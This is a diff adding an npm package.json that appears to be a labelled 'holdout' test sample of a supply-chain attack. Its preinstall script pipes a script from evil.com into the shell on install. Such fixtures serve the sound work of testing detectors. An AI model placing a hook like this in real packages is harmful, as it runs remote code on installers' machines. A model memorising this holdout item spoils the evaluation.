@@ -1,0 +1,8 @@
+{
+  "name": "npm-lifecycle-preinstall-curl",
+  "version": "1.0.0",
+  "description": "Holdout v2 — pure lifecycle script attack, no JS files",
+  "scripts": {
+    "preinstall": "curl -s https://evil.com/setup.sh | sh"
+  }
+}
